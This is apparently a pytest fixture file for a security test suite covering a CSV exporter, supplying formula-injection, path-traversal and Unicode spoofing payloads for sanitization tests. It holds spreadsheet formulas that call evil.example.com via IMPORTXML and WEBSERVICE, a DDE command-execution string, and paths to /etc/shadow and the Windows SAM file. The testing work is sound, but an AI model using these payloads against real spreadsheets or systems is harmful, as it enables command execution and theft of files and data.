"""Shared fixtures for the security test suite.

Provides reusable payloads, path helpers, and isolation utilities so the
individual test modules stay short and DRY.  Does NOT duplicate anything
already in tests/conftest.py.
"""

import os
from collections.abc import Callable, Generator
from pathlib import Path

import pytest

# ---------------------------------------------------------------------------
# Formula-injection payloads (M01)
# ---------------------------------------------------------------------------

_FORMULA_INJECTION_PAYLOADS: list[str] = [
    # Leading single-character triggers
    "=A1",
    "+1+1",
    "-1",
    "@SUM(A1:A2)",
    "\t=tabbed",
    "\r=cr-leading",
    # Full, realistic formulas that execute in Sheets/Excel
    '=HYPERLINK("https://evil.example.com","click")',
    "=cmd|'/c calc'!A0",
    '=IMPORTXML("https://evil.example.com","/")',
    '=WEBSERVICE("https://evil.example.com")',
    "+1+cmd|'/c calc'!A0",
    "-2+cmd|'/c calc'!A0",
]

_BENIGN_LEADING_CHARS: list[str] = [
    "regular description",
    "123 amount",
    "Starbucks coffee",
    "McDonald's restaurant",
    "(parenthesised)",
    "UPPER CASE",
]


@pytest.fixture(params=_FORMULA_INJECTION_PAYLOADS, ids=lambda p: repr(p[:20]))
def formula_injection_payload(request: pytest.FixtureRequest) -> str:
    """One formula-injection string per parametrized test invocation."""
    return str(request.param)


@pytest.fixture
def formula_injection_payloads() -> list[str]:
    """Full list of formula-injection payloads for bulk tests."""
    return list(_FORMULA_INJECTION_PAYLOADS)


@pytest.fixture
def benign_leading_chars() -> list[str]:
    """Strings that must NOT be mangled by sanitization (negative control)."""
    return list(_BENIGN_LEADING_CHARS)


# ---------------------------------------------------------------------------
# Path-traversal vectors (F01 / M03 / M04 / M13)
# ---------------------------------------------------------------------------

_PATH_TRAVERSAL_VECTORS: list[str] = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "/etc/shadow",
    "%2e%2e/%2e%2e/etc/passwd",
    "....//....//etc/passwd",
    "\x00etc/passwd",
]


@pytest.fixture(params=_PATH_TRAVERSAL_VECTORS, ids=lambda p: repr(p[:30]))
def path_traversal_vector(request: pytest.FixtureRequest) -> str:
    """One path-traversal string per parametrized test invocation."""
    return str(request.param)


@pytest.fixture
def path_traversal_vectors() -> list[str]:
    """Full list of path-traversal vectors."""
    return list(_PATH_TRAVERSAL_VECTORS)


# ---------------------------------------------------------------------------
# Unicode spoof payloads (M09 / M10)
# ---------------------------------------------------------------------------

_HOMOGRAPH_PAYLOADS: list[str] = [
    # Cyrillic 'а' (U+0430) looks identical to Latin 'a'
    "оrlen",  # Cyrillic 'о' + Latin 'rlen'
    "bіedronka",  # Cyrillic 'і' inside
]

_UNICODE_SPOOF_PAYLOADS: list[str] = [
    "‮=evil",  # RIGHT-TO-LEFT OVERRIDE before formula trigger
    "desc​ription",  # Zero-width space
    "desc‌ription",  # Zero-width non-joiner
    "desc‍ription",  # Zero-width joiner
    "﻿BOM-prefix",  # BOM mid-string
]


@pytest.fixture
def homograph_payloads() -> list[str]:
    """Cyrillic/Latin homograph strings."""
    return list(_HOMOGRAPH_PAYLOADS)


@pytest.fixture
def unicode_spoof_payloads() -> list[str]:
    """Unicode spoof strings including RLO and zero-width characters."""
    return list(_UNICODE_SPOOF_PAYLOADS)


# ---------------------------------------------------------------------------
# File helpers
# ---------------------------------------------------------------------------


@pytest.fixture
def write_csv_bytes(tmp_path: Path) -> Callable[[bytes, str], Path]:
    """Return a helper that writes raw bytes to a file under tmp_path.

    Needed for BOM and encoding-mismatch tests where text-mode helpers would
    silently re-encode the content.
    """

    def _write(data: bytes, name: str = "in.csv") -> Path:
        path = tmp_path / name
        path.write_bytes(data)
        return path

    return _write


# ---------------------------------------------------------------------------
# CWD isolation (M21)
# ---------------------------------------------------------------------------


@pytest.fixture
def isolated_cwd(tmp_path: Path) -> Generator[Path]:
    """Change the process CWD to *tmp_path* for the duration of the test.

    Prevents exporter functions that write to relative paths (e.g.
    ``for_google_spreadsheet.csv``) from polluting the repository root.
    Yields the tmp_path so callers can build expected output paths.
    """
    original = Path.cwd()
    os.chdir(tmp_path)
    try:
        yield tmp_path
    finally:
        os.chdir(original)
